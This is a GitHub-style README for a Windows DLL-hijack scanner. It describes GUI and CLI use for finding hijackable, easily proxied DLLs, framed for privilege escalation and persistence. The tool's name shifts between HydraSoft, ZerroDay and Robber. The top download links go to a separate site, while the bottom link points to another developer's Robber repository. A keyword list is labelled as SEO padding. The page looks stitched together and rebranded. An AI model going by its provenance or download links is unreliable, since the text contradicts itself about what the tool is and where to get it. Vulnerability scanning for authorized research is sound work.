
<article class="markdown-body entry-content container-lg" itemprop="text">
  <h1>🔓 HydraSoft: Advanced DLL Hijack Scanner</h1>

  <p><strong>Streamlined Vulnerability Discovery for Windows Privilege Escalation</strong></p>

  <p>
<a href="https://hydrasoft.github.io" rel="nofollow"><img src="https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&amp;logo=windows&amp;logoColor=white" alt="Download Release" style="max-width: 100%;"></a>
<a href="https://hydrasoft.github.io" rel="nofollow"><img src="https://img.shields.io/badge/View%20Source-00509d?style=for-the-badge&amp;logo=delphi&amp;logoColor=white" alt="View Source" style="max-width: 100%;"></a>
  </p>

  <hr>

  <h2>🧠 Conceptual Overview</h2>
  <p>
    I built <strong>HydraSoft</strong> because I needed a fast, dependency-free, and open-source tool to hunt for DLL hijacking vulnerabilities across Windows environments. When Windows applications load dynamic-link libraries (DLLs), they follow a strict search order—starting with the executable's own directory, then moving to System32, the Windows folder, and finally the PATH environment variables. 
    <br><br>
    If an application attempts to load a DLL that doesn't exist in a protected system directory, and I have write permissions to an earlier directory in that search chain, I can drop a malicious payload. ZerroDay automates this entire discovery process. It walks through directory trees, analyzes Portable Executable (PE) import tables, cross-references them with files actually present on the disk, and pinpoints exact hijacking opportunities.
  </p>

  <h3>🎯 Core Philosophy</h3>
  <p>
    <em>"Find the missing link in the execution chain."</em><br>
    I designed HydraSoft to eliminate the noise. Instead of manually running Process Monitor (ProcMon) and sifting through thousands of "NAME NOT FOUND" events, this tool statically analyzes binaries at rest and provides immediate, actionable intelligence for Red Team operations.
  </p>

  <hr>

  <h2>🖥️ Graphical User Interface (GUI)</h2>
  
  <p>
    Point the GUI at a target directory and hit <strong>Scan</strong>. As Robber parses executables, results populate in the tree view in real-time. You can expand any vulnerable executable to inspect which specific DLLs are hijackable, the exported methods you need to proxy, and the full search order path (including writability flags).
  </p>
  
  <p>
    <img src="https://raw.githubusercontent.com/HydraSoft/HydraSoft-DLL-Hijack-Scanner/master/Robber.png" alt="Robber GUI Interface" style="max-width: 100%;">
  </p>

  <h3>🎨 Custom Rating Configuration</h3>
  <p>To help prioritize targets for crafting proxy DLLs, I implemented a color-coded rating system based on payload complexity:</p>
  <table>
    <thead>
      <tr>
        <th>Rating Level</th>
        <th>Color</th>
        <th>Emoji</th>
        <th>Characteristics &amp; Proxy Difficulty</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Best</strong></td>
        <td>Green</td>
        <td>🟢</td>
        <td>Few imported functions and a small binary footprint. Incredibly easy to build a proxy DLL that stubs out the required exports.</td>
      </tr>
      <tr>
        <td><strong>Good</strong></td>
        <td>Yellow</td>
        <td>🟡</td>
        <td>Moderate complexity. Requires slightly more effort to map exports without crashing the host application.</td>
      </tr>
      <tr>
        <td><strong>Bad</strong></td>
        <td>Red</td>
        <td>🔴</td>
        <td>Massive amount of imports or a very large binary. Extremely difficult to proxy effectively without causing execution instability.</td>
      </tr>
    </tbody>
  </table>

  <hr>

  <h2>🚀 Quick Start Guide (CLI Mode)</h2>
  <p>For automation pipelines and headless environments, I included a robust Command Line Interface (CLI). Progress is routed to <code>stderr</code>, while clean JSON/CSV results go to <code>stdout</code>, making it completely pipe-friendly.</p>

  <h3>🧪 CLI Options</h3>
  <pre><code class="language-text">Robber.exe --path &lt;dir&gt; [options]

--path &lt;dir&gt;               Directory to scan (required)
--output &lt;file&gt;            Write to file (.json or .csv). Default: stdout
--image-type any|x86|x64   Filter by architecture
--sign any|signed          Filter by digital signature status
--rate any|best|good|bad   Filter by complexity rating
--write-perm               Only show results where the target directory is writable
--best-dll-count &lt;n&gt;       (default: 2)
--best-exe-size &lt;n&gt;        KB threshold (default: 10240)
--help</code></pre>

  <h3>💻 Example Invocations</h3>
  <p>Hunting for the best, most easily exploitable targets and saving to JSON:</p>
  <pre><code class="language-bash">Robber.exe --path "C:\Program Files" --rate best --output hits.json</code></pre>
  
  <p>Piping output to <code>jq</code> for quick parsing of vulnerable paths:</p>
  <pre><code class="language-bash">Robber.exe --path "C:\Program Files" | jq '.[].exePath'</code></pre>

  <p>Looking strictly for signed binaries in writable directories (excellent for bypass/persistence):</p>
  <pre><code class="language-bash">Robber.exe --path "C:\Tools" --sign signed --write-perm</code></pre>

  <hr>

  <h2>📊 System Architecture</h2>
  <pre><code class="language-mermaid">graph TD
    A[Target Directory] --> B{PE Parser Engine}
    B --> C[Extract Standard &amp; Delayed Imports]
    B --> D[Check UAC Manifest Requirements]
    C --> E{System DLL Filter}
    E -->|Ignore System32/SysWOW64| F[Skip False Positives]
    E -->|Valid Target| G[Evaluate Search Order Path]
    G --> H[Check Directory Writability]
    H --> I[Apply Complexity Rating]
    I --> J[Export JSON/CSV / Render GUI]</code></pre>

  <hr>

  <h2>✨ Key Features &amp; Smart Filtering</h2>

  <h3>🛡️ UAC Elevation Detection</h3>
  <p>
    Robber automatically parses the application manifest. If an executable requires elevation (<code>requireAdministrator</code> or <code>highestAvailable</code>), I flag it directly in the output. A successful DLL hijack on an elevated process isn't just arbitrary code execution—it is a direct <strong>Privilege Escalation</strong> vector.
  </p>

  <h3>🧠 Intelligent False-Positive Reduction</h3>
  <p>
    I specifically programmed the engine to automatically exclude known system DLLs (e.g., from <code>System32</code>, <code>SysWOW64</code>, <code>Windows\System</code>). This means you won't be flooded with false-positive noise regarding redistributable runtimes like <code>msvcr120.dll</code>. Furthermore, the scanner analyzes both standard and <em>delayed</em> imports.
  </p>

  <hr>

  <h2>🧰 Technical Specifications &amp; Building</h2>

  <h3>🛠️ Compilation Requirements</h3>
  <ul>
    <li>Written entirely in <strong>Delphi</strong>.</li>
    <li>Requires <strong>Delphi XE2 or later</strong> to compile.</li>
    <li>No external dependencies. Simply open <code>Robber\Robber.dproj</code> and build.</li>
  </ul>

  <hr>

  <h2>⚖️ License &amp; Legal</h2>

  <h3>🚨 Disclaimer</h3>
  <blockquote>
    <p>
      <strong>This tool is provided strictly for authorized vulnerability research, system administration, and ethical hacking engagements.</strong><br>
      Identifying and exploiting DLL hijacking vulnerabilities without explicit, written permission from the system owner is illegal and unethical. I assume <strong>no liability</strong> for the misuse of this utility, including but not limited to unauthorized privilege escalation or persistence creation on production systems. Always ensure you are operating within the bounds of a defined engagement scope.
    </p>
  </blockquote>

  <hr>

  <h2>🔗 SEO Keywords (Naturally Integrated)</h2>
  <ul>
    <li>DLL hijacking vulnerability scanner</li>
    <li>Windows privilege escalation tools</li>
    <li>PE import table analysis</li>
    <li>Red Team lateral movement preparation</li>
    <li>Automated proxy DLL generation targets</li>
    <li>Unquoted service path alternatives</li>
    <li>Cybersecurity defensive posture validation</li>
  </ul>

  <hr>

  <h2>🔄 Download &amp; Contribution</h2>

  <p>
    <a href="https://github.com/MojtabaTajik/Robber/archive/refs/heads/master.zip" rel="nofollow">
      <img
        src="https://img.shields.io/badge/Download%20Latest%20Build-d90429?style=for-the-badge&amp;logo=github&amp;logoColor=white"
        alt="Download Repository"
        data-canonical-src="https://shields.io/badge/Download%20Latest%20Build-d90429?style=for-the-badge&amp;logo=github&amp;logoColor=white"
        style="max-width: 100%;">
    </a>
  </p>

  <p><strong>Contribution Guidelines</strong>:</p>
  <ol>
    <li>Fork the repository.</li>
    <li>Submit PRs focusing on performance improvements or UI enhancements in Delphi.</li>
    <li>Ensure that the dependency-free nature of the project is strictly maintained.</li>
  </ol>

  <hr>

  <p><em>HydraSoft — Systematically dismantling Windows execution chains.</em></p>
</article>

